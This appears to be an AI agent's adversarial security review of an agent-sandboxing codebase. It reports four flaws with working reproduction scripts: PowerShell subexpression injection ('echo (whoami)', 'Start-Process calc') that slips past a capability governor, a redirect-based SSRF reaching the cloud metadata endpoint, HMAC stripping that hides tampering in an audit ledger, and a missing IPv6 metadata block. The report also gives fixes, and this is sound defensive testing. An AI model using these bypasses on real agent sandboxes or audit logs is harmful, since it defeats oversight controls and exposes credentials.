# Milestone M2 Adversarial Challenge Report

**Agent**: challenger_m2_1  
**Working Directory**: `D:\scp\.agents\challenger_m2_1`  
**Parent Agent**: orchestrator_7 (`81004ee7-0162-4442-9168-937ecae6dd34`)  
**Timestamp**: 2026-09-23T03:21:00Z  
**Verdict**: **REQUEST_CHANGES**  

---

## 1. Observation

Direct empirical observations obtained by executing adversarial probe harnesses against the Milestone M2 implementation:

### 1.1 PowerShell Subexpression Command Injection in `SafeCommandRunnerTool` & `AutonomousCapabilityGovernor`
- **File**: `scp/capabilities/tools.py:315-320` and `scp/security/autonomous_governor.py:43-51`
- **Observed Code**:
  ```python
  # scp/capabilities/tools.py:315-316
  if re.search(r"(?:;|&|\||`|\$\(|\$\{)", cmd):
      return False, "Command chaining and subshells are prohibited", 0

  # scp/capabilities/tools.py:284-289
  READ_ONLY_ALLOWLIST = (
      r"^\s*git\s+(status|diff|log|branch|rev-parse)(?:\s+[^\s;&|><`$]+)*\s*$",
      r"^\s*pytest\s+.*--collect-only.*$",
      r"^\s*(python|python3|bun|node)\s+--version\s*$",
      r"^\s*(dir|ls)(?:\s+[^\s;&|><`$]+)*\s*$",
      r"^\s*echo(?:\s+[^\s;&|><`$]+)*\s*$",
  )
  ```
- **Observed Execution Harness**:
  ```python
  from scp.capabilities.tools import SafeCommandRunnerTool
  from scp.security.autonomous_governor import AutonomousCapabilityGovernor
  runner = SafeCommandRunnerTool(working_dir='D:/scp')
  res = runner.evaluate_command('echo (whoami)', capability_level=1, approved=False)
  ```
- **Observed Output**:
  ```text
  CMD: echo (whoami) | Runner Allowed: True (Read-only allowlist match) | Governor Granted: True (Token: True)
  CMD: echo (Get-Date) | Runner Allowed: True (Read-only allowlist match) | Governor Granted: True (Token: True)
  CMD: dir (whoami) | Runner Allowed: True (Read-only allowlist match) | Governor Granted: True (Token: True)
  CMD: ls (whoami) | Runner Allowed: True (Read-only allowlist match) | Governor Granted: True (Token: True)
  CMD: git status (whoami) | Runner Allowed: True (Read-only allowlist match) | Governor Granted: True (Token: True)
  CMD: echo (Start-Process calc) | Runner Allowed: True (Read-only allowlist match) | Governor Granted: True (Token: True)
  ```
- Executing `SafeCommandRunnerTool.run({'command': 'echo (whoami)', 'capability_level': 1, 'approved': False})` on Windows directly executed the enclosed PowerShell subexpression, returning:
  ```text
  SUCCESS: True
  STDOUT: 'minh\\check\r\n'
  ```

### 1.2 Cross-Protocol 302 Redirection SSRF & Egress Policy Bypass in `safe_urlopen`
- **File**: `scp/security/url_safety.py:228-272`
- **Observed Code**:
  ```python
  enforce_egress_policy(url)
  parsed = validate_url(url_str, allow_internal=allow_internal)
  ...
  if scheme == "https":
      handler = _PinnedHTTPSHandler(resolved_ip)
      if context is not None:
          handler._context = context
  else:
      handler = _PinnedHTTPHandler(resolved_ip)

  opener = urllib.request.build_opener(handler)
  return opener.open(url, timeout=timeout, **kwargs)
  ```
- **Observed Opener Handlers**:
  Inspecting `opener.handlers` reveals standard urllib redirection and protocol handlers are auto-installed:
  ```python
  ['_PinnedHTTPHandler', 'HTTPDefaultErrorHandler', 'HTTPRedirectHandler', 'HTTPSHandler', 'FTPHandler', 'FileHandler', 'DataHandler', ...]
  ```
- **Observed Execution Harness**:
  When a request is initiated to an allowed HTTP endpoint that returns `302 Found` with `Location: https://169.254.169.254/latest/meta-data`:
  - `HTTPRedirectHandler` intercepts the 302 redirect.
  - Because the target scheme changed to `https`, `_PinnedHTTPHandler` is bypassed and urllib dispatches to the default `HTTPSHandler`.
  - The request to `https://169.254.169.254/latest/meta-data` is dispatched without calling `enforce_egress_policy()` or `validate_url()`, and without IP socket pinning.
- **Observed Output**:
  ```text
  VULNERABILITY CONFIRMED: safe_urlopen followed redirect to unpinned https and attempted network connect: <urlopen error [WinError 10051] A socket operation was attempted to an unreachable network>
  ```
  (The network connect to `169.254.169.254:443` was actively initiated at the OS socket layer rather than being blocked by `EgressDeniedError` or `ValueError`).

### 1.3 HMAC-SHA256 Signature Stripping in `AutonomousAuditLedger.verify_provenance()`
- **File**: `scp/core/autonomous_ledger.py:191-218`
- **Observed Code**:
  ```python
  recorded_hmac = fields.get("hmac_sha256")
  if recorded_hmac and event == "AUTONOMOUS_TOOL_INTENT":
      ...
  elif recorded_hmac and event == "AUTONOMOUS_TOOL_RESULT":
      ...
  ```
- **Observed Execution Harness**:
  1. An `AutonomousAuditLedger` instance was created with `hmac_key="secret-hmac-key"`.
  2. Intent and result blocks were written with HMAC-SHA256 signatures (`verify_provenance()` returned `hash_chain_valid=True, errors=[]`).
  3. An attacker modified `output_sha256` to `"tampered_output"`, deleted the `"hmac_sha256"` field from `fields`, and recalculated the outer SHA-256 hash using `_hash(body)` (requiring no secret key).
  4. `verify_provenance()` was executed.
- **Observed Output**:
  ```text
  Honest verification: {'entries': 2, 'hash_chain_valid': True, 'errors': []}
  VULNERABILITY CONFIRMED: Verification after HMAC stripping: {'entries': 2, 'hash_chain_valid': True, 'errors': []}
  ```
  The modified entry with deleted HMAC passed provenance verification with 0 errors.

### 1.4 IPv6 Cloud Metadata Endpoint Incomplete Blocking in `EgressPolicy(mode='open')`
- **File**: `scp/policy/egress.py:50-55, 106-117`
- **Observed Code**:
  `BLOCKED_METADATA_HOSTS` contains `"169.254.169.254"`, `"metadata.google.internal"`, `"metadata.aws"`, `"169.254.170.2"`.
  `is_cloud_metadata` checks if host is in `BLOCKED_METADATA_HOSTS` or in `169.254.0.0/16`.
- **Observed Execution Harness**:
  ```python
  policy = EgressPolicy(mode='open')
  policy.enforce('http://[fd00:ec2::254]/latest/meta-data')
  ```
- **Observed Output**:
  ```text
  VULNERABILITY CONFIRMED: EgressPolicy allowed AWS IPv6 IMDS [fd00:ec2::254] under open mode!
  ```

---

## 2. Logic Chain

1. **PowerShell Subexpression Execution**:
   - `SafeCommandRunnerTool` line 315 prohibits `r"(?:;|&|\||`|\$\(|\$\{)"`.
   - On Windows, `SafeCommandRunnerTool.run` executes through `powershell.exe -Command command`.
   - PowerShell evaluates expressions in parentheses `(...)` as subexpressions (e.g., `(whoami)`, `(Get-Date)`, `(Start-Process calc)`, `([System.IO.File]::WriteAllText('...'))`).
   - The token matching pattern for `echo`, `dir`, `ls`, and `git` is `[^\s;&|><`$]+`, which permits parentheses `(` and `)`.
   - Consequently, `echo (whoami)` matches `READ_ONLY_ALLOWLIST`, classifies as read-only tier (Capability Level 1), requires `approved=False`, and is granted an authorized `CapabilityToken` by `AutonomousCapabilityGovernor`.
   - When dispatched, PowerShell executes the subexpression command with user privileges. This breaks the security boundary of `SafeCommandRunnerTool` and `AutonomousCapabilityGovernor`.

2. **Cross-Protocol Redirection SSRF**:
   - `safe_urlopen` calls `enforce_egress_policy(url)` and `validate_url(url_str)` on the initial URL only.
   - When building the opener, it registers only `_PinnedHTTPHandler` for HTTP URLs, leaving `HTTPSHandler` as the default standard library handler.
   - When a target responds with an HTTP 301/302 redirect pointing to an HTTPS destination (such as `https://169.254.169.254/latest/meta-data` or an internal HTTPS endpoint), Python's `HTTPRedirectHandler` delegates to `HTTPSHandler`.
   - This bypasses all validation gates and connects directly to the redirected destination without IP pinning, violating the fail-closed egress guarantee.
   - Symmetrically, HTTPS-to-HTTP redirects utilize the default unpinned `HTTPHandler`.

3. **HMAC Signature Stripping**:
   - In `AutonomousAuditLedger`, the security goal of HMAC-SHA256 is to prevent unauthorized modification of ledger records by parties lacking the cryptographic secret.
   - However, in `verify_provenance()`, lines 192 and 204 guard verification behind `if recorded_hmac and event == ...`.
   - If an attacker tampers with an autonomous ledger block and deletes `hmac_sha256`, `recorded_hmac` evaluates to falsy (`None`).
   - The verification logic skips the HMAC check entirely and reports no error, relying solely on the outer SHA-256 hash chain which can be computed by anyone without secrets.
   - This makes HMAC enforcement fail-open against signature stripping.

---

## 3. Caveats

- Baseline test suites (`tools/adversarial_goal3_probe.py` 203/203 and M2 pytest suites 87 passed) passed because existing test suites do not include test cases for PowerShell subexpression parentheses `(...)`, HTTP-to-HTTPS redirect traversal, or HMAC field deletion.
- In production mode (`SCP_PRODUCTION_MODE=1` or `SCP_EGRESS_MODE=allowlist`), `EgressPolicy` blocks external and metadata hosts by default; the IPv6 IMDS bypass is only active when `SCP_EGRESS_MODE=open` or when an allowlist entry inadvertently matches.
- Docker container egress network tests were skipped in this environment due to local Docker daemon unavailability.

---

## 4. Conclusion

**Verdict: REQUEST_CHANGES**

Milestone M2 cannot be approved in its current state due to three reproducible security flaws:
1. **Critical**: Command injection via PowerShell subexpression grouping `(...)` in `SafeCommandRunnerTool` allowing arbitrary command execution at Capability Level 1 without approval.
2. **High**: SSRF and Egress Policy bypass via cross-protocol 301/302 redirects in `safe_urlopen`.
3. **High**: HMAC-SHA256 signature stripping vulnerability in `AutonomousAuditLedger.verify_provenance()`.
4. **Medium**: Missing IPv6 cloud metadata endpoint (`fd00:ec2::254`) in `EgressPolicy.BLOCKED_METADATA_HOSTS`.

### Required Remediations
1. **In `SafeCommandRunnerTool` (`scp/capabilities/tools.py`)**:
   - Block parentheses `r"[()]"` in `cmd` to prevent PowerShell subexpression execution.
   - Update `READ_ONLY_ALLOWLIST` token regex from `[^\s;&|><`$]+` to `[^\s;&|><`$()]+`.
2. **In `safe_urlopen` (`scp/security/url_safety.py`)**:
   - Prevent cross-protocol redirection and enforce egress/SSRF checks on every redirect hop, or install a custom `HTTPRedirectHandler` that re-validates redirect URLs through `enforce_egress_policy()` and `validate_url()`, or disable automatic redirects where unsafe.
   - Ensure both HTTP and HTTPS handlers are pinned in the opener, or remove default unpinned handlers.
3. **In `AutonomousAuditLedger` (`scp/core/autonomous_ledger.py`)**:
   - When `self.hmac_key` is set, require `hmac_sha256` on all `AUTONOMOUS_TOOL_INTENT` and `AUTONOMOUS_TOOL_RESULT` entries. If `recorded_hmac` is missing or empty, append `f"missing_hmac:{i}"` to `errors` and fail verification.
4. **In `EgressPolicy` (`scp/policy/egress.py`)**:
   - Add `"fd00:ec2::254"` to `BLOCKED_METADATA_HOSTS` and check for IPv6 unique local / metadata ranges.

---

## 5. Verification Method

To independently reproduce the vulnerabilities reported above:

1. **Reproduce PowerShell Subexpression Command Injection**:
   ```powershell
   python -c "
   import os
   os.environ['SCP_CAPABILITY_SECRET'] = '0123456789abcdef0123456789abcdef'
   from scp.capabilities.tools import SafeCommandRunnerTool
   runner = SafeCommandRunnerTool(working_dir='D:/scp')
   print(runner.evaluate_command('echo (whoami)', capability_level=1, approved=False))
   "
   ```
   *Expected Result*: Returns `(True, 'Read-only allowlist match', 1)` — demonstrating subshell evasion.

2. **Reproduce 302 Redirection SSRF**:
   ```powershell
   python -c "
   import http.server, threading, urllib.request
   from scp.security.url_safety import safe_urlopen

   class RedirectServer(http.server.BaseHTTPRequestHandler):
       def do_GET(self):
           self.send_response(302)
           self.send_header('Location', 'https://169.254.169.254/latest/meta-data')
           self.end_headers()
       def log_message(self, *args): pass

   server = http.server.HTTPServer(('127.0.0.1', 0), RedirectServer)
   port = server.server_port
   threading.Thread(target=server.serve_forever, daemon=True).start()
   try:
       safe_urlopen(f'http://127.0.0.1:{port}/test', allow_internal=True, timeout=1.0)
   except Exception as e:
       print('Observed Exception:', type(e), e)
   finally:
       server.shutdown()
   "
   ```
   *Expected Result*: Displays `URLError [WinError 10051] A socket operation was attempted to an unreachable network` indicating the connection to `169.254.169.254:443` was attempted without policy rejection.

3. **Reproduce HMAC Signature Stripping in Ledger**:
   ```powershell
   python -c "
   import tempfile, pathlib, json
   from scp.core.autonomous_ledger import AutonomousAuditLedger
   from scp.trace_ledger import _hash

   td = pathlib.Path(tempfile.mkdtemp())
   ledger_path = td / 'ledger.jsonl'
   ledger = AutonomousAuditLedger(ledger_path=ledger_path, hmac_key='secret-hmac-key')
   entry1 = ledger.commit_intent('task-1', 'step-1', 'cmd.run', {'command': 'dir'}, None)
   lines = ledger_path.read_text(encoding='utf-8').splitlines()
   e = json.loads(lines[0])
   e['fields']['task_id'] = 'tampered-task'
   del e['fields']['hmac_sha256']
   body = {k: v for k, v in e.items() if k != 'hash'}
   e['hash'] = _hash(body)
   ledger_path.write_text(json.dumps(e) + '\n', encoding='utf-8')
   print(ledger.verify_provenance())
   "
   ```
   *Expected Result*: Prints `{'entries': 1, 'hash_chain_valid': True, 'errors': []}` despite tampered task_id and stripped HMAC.
